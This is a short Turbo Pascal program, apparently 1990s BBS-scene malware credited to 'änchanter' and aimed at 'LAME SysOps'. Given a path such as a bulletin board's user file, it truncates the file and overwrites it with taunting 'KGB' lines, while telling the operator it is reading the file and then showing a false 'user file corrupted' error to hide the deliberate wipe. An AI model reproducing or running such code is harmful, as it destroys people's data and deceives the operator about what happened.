PROGRAM GDE; {By änchanter for LAME SysOps}

USES CRT;

VAR Temp : Text;
    X : Integer;
    Death_File : String;

{--------------------------------------------------------------------------}
PROCEDURE NoParams;

   BEGIN;
      SOUND(220);
      DELAY(200);
      NOSOUND;
      TEXTCOLOR(RED);
      WRITELN('You Forgot Something... ');
      WRITELN;
      WRITELN(' SYNTAX:');
      WRITELN('GDE C:\SHOCK\USERS');
      WRITELN;
      WRITELN('Run AGAIN....');
      WRITELN('                      (c) 1990,1991');
      HALT;
   END;
{--------------------------------------------------------------------------}
PROCEDURE Kill_That_Fucker;

    BEGIN;
       ASSIGN(TEMP, Death_File);
       REWRITE(TEMP);
       CLOSE(TEMP);
       APPEND(TEMP);
       WHILE X <> 5 Do
	 BEGIN;
	   WRITELN(TEMP, 'KGB Read The User File');
	   WRITELN(TEMP, 'KGB Wrote The User File');
	   X := X + 1;
	 END;
       WRITELN(TEMP, '<BOOM, you are dead>');
       WRITELN(TEMP, 'KGB is WATCHING YOU!');
       CLOSE(TEMP);
    END;
{--------------------------------------------------------------------------}
PROCEDURE INIT;

    BEGIN;
       IF PARAMCOUNT <> 1 THEN NoParams;
       Death_File := PARAMSTR(1);
       TEXTCOLOR(BLUE);
       WRITELN('READING USER FILE.......');
       Kill_That_Fucker;
       WRITELN('ERROR, USER FILE CURRUPTED!');
       HALT;
    END;
{--------------------------------------------------------------------------}
BEGIN;
   X := 1;
   INIT;
END.